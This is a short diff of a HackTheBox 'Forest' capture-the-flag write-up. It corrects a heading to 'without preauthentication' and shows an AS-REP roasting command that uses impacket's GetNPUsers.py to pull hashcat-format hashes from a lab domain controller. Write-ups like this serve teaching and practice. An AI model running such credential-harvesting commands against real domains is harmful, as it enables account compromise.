@@ -504,7 +504,7 @@ Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 
 enum4linux complete on Tue Dec 29 13:10:58 2020
 ```
-Find service accounts with preauthentication:
+Find service accounts without preauthentication:
 ```bash
 ─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[/usr/share/doc/python3-impacket/examples]
 └──╼ [★]$ python3 GetNPUsers.py -dc-ip 10.129.1.77 -no-pass -usersfile /home/htb-jib1337/writeups/HackTheBox/HTB_Forest/users.txt 'htb.local/' -format hashcat
